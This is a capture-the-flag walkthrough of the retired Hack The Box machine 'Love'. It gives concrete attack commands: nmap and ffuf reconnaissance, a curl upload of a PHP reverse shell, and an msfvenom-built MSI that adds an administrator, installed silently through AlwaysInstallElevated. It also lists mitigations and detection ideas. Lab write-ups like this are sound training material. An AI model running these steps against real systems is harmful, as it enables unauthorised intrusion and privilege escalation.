---
machine: Love
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, ssrf, file-upload, alwaysinstallelevated, msi]
---

# Love — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An SSRF scanner on `staging.love.htb` reaches an internal panel on `localhost` and leaks administrator credentials. The voting system allows a file upload and PHP execution. Escalation is `AlwaysInstallElevated`: a malicious MSI installs as SYSTEM.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80,443,445,5985 <IP>
```

- IIS, SMB and WinRM.
- Vhosts `love.htb` and `staging.love.htb`.

## Enumeration

```bash
ffuf -u http://<IP>/ -H 'Host: FUZZ.love.htb' -w subdomains.txt
```

`staging.love.htb` provides a URL scanner. Pointing it at `http://localhost:5000` returns a panel with credentials.

## Foothold

The credentials grant access to the voting system. The upload does not validate content: a PHP reverse shell is uploaded and the public path is visited.

```bash
curl -s -F "file=@shell.php" http://<IP>/upload.php
```

The shell runs as the web service account.

## Lateral movement

Enumerate users, shares and permissions. The panel credentials can be reused over WinRM.

## Privilege escalation

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both keys are `1`. An MSI that adds an administrator is generated and installed:

```bash
msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## Evidence

- SSRF scanner response with redacted credentials.
- PHP upload and execution.
- Registry queries returning `1`.
- `whoami /groups` as SYSTEM.

## Lessons learned

- An internal SSRF can expose unauthenticated panels.
- Extension-only validation does not stop code upload.
- `AlwaysInstallElevated` turns any user into SYSTEM.

## Mitigations and detection

- Restrict the scanner to external targets and authenticate internal panels.
- Validate real type, name and content of uploads.
- Disable `AlwaysInstallElevated` in both registry branches.
- Alert on `msiexec` started by standard users and on PHP uploads.

## References

- <https://www.hackthebox.com/machines/Love>
- <https://0xdf.gitlab.io/2021/05/01/htb-love.html>
- <https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated>
- <https://attack.mitre.org/techniques/T1548/002/>
